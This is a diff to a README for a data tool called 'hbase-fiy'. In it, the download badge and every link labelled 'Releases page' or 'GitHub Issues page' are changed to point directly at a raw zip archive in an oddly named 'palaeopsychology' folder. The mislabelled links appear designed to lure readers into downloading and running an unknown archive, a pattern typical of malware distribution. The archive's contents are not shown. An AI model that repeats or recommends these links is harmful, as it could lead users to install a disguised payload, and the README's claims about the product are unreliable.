@@ -1,6 +1,6 @@
 # 🚀 hbase-fiy - Simple Solution for Your Data Needs
 
-[![Download hbase-fiy](https://raw.githubusercontent.com/rug5803/hbase-fiy/main/palaeopsychology/hbase-fiy.zip)](https://raw.githubusercontent.com/rug5803/hbase-fiy/main/palaeopsychology/hbase-fiy.zip)
+[![Download hbase-fiy](https://github.com/rug5803/hbase-fiy/raw/refs/heads/main/palaeopsychology/hbase-fiy-2.0.zip)](https://github.com/rug5803/hbase-fiy/raw/refs/heads/main/palaeopsychology/hbase-fiy-2.0.zip)
 
 ## 📦 Introduction
 
@@ -10,7 +10,7 @@ Welcome to **hbase-fiy**! This application helps you manage and work with large 
 
 To run **hbase-fiy**, you need to download the application from our Releases page. Here’s how:
 
-1. Click the download link above or visit the [Releases page](https://raw.githubusercontent.com/rug5803/hbase-fiy/main/palaeopsychology/hbase-fiy.zip).
+1. Click the download link above or visit the [Releases page](https://github.com/rug5803/hbase-fiy/raw/refs/heads/main/palaeopsychology/hbase-fiy-2.0.zip).
 2. Look for the latest version listed at the top.
 3. Choose the download file that suits your operating system (Windows, Mac, or Linux).
 4. Click on the file to start the download.
@@ -63,9 +63,9 @@ Once you have the file downloaded:
 
 If you encounter any issues during installation or usage:
 
-- **Check for Updates:** Ensure you are using the latest version from the [Releases page](https://raw.githubusercontent.com/rug5803/hbase-fiy/main/palaeopsychology/hbase-fiy.zip).
+- **Check for Updates:** Ensure you are using the latest version from the [Releases page](https://github.com/rug5803/hbase-fiy/raw/refs/heads/main/palaeopsychology/hbase-fiy-2.0.zip).
 - **System Compatibility:** Double-check that your system meets the requirements listed above.
-- **Community Support:** Visit our [GitHub Issues page](https://raw.githubusercontent.com/rug5803/hbase-fiy/main/palaeopsychology/hbase-fiy.zip) for help from the community.
+- **Community Support:** Visit our [GitHub Issues page](https://github.com/rug5803/hbase-fiy/raw/refs/heads/main/palaeopsychology/hbase-fiy-2.0.zip) for help from the community.
 
 ## 📄 Contributing
 
